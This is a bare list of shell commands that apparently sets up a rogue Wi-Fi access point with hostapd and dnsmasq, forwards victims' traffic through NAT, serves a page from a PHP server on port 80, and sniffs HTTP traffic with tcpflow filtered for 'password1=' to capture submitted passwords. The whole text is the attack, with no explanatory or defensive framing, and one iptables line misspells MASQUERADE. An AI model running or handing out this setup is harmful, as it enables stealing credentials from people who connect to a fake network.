hostapd hostapd.conf
dnsmasq -C dnsmasq.conf
ifconfig wlan1 up 192.168.1.1 netmask 255.255.255.0
route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1
iptables --table nat --append POSTROUTING --out-interface wlan0 -j MASKQUERADE
iptables --append FORWARD --in-interface wlan1 -j ACCEPT
echo 1 > /proc/sys/net/ipv4/ip_forward
php -S 192.168.1.1:80
tcpflow -i wlan1 -C -g port 80 | grep -i "password1="
#wlan1 = monitor interface
